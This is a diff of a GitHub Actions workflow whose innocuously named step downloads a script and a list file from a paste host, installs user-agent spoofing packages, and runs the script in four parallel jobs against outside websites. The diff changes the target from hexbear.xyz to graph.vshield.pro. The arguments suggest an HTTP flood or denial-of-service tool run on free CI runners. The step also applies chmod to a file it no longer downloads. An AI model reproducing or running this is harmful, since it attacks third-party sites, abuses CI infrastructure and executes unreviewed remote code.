@@ -15,13 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/HxWoN/ua.txt
-          wget https://curl.by/YcH34/value.js
+          wget https://curl.by/C_qXK/nosec.js
           wget https://curl.by/19kka/fres.txt
           chmod +x value.js
+          npm i user-agents fake-useragent 
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node value.js https://hexbear.xyz/ 100 90 8 fres.txt
+            timeout 105 node nosec.js https://graph.vshield.pro/ 100 90 8 fres.txt
             PIDS+=($!)
           done
           
